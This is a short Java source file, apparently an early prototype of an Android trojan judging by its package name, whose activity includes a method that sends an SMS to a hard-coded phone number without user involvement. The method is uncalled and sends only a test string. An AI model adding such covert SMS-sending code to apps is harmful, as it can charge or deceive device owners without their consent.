package trojan.android.android_trojan;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsManager;

/**
 * Created by Jean-Laurent on 26/11/2014.
 */
public class first_activity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.first_activity);

    }

    public void SmsManager() {
        SmsManager manager = SmsManager.getDefault();
        manager.sendTextMessage("0628470850", null, "Test Message 1 !", null, null);
    }

}

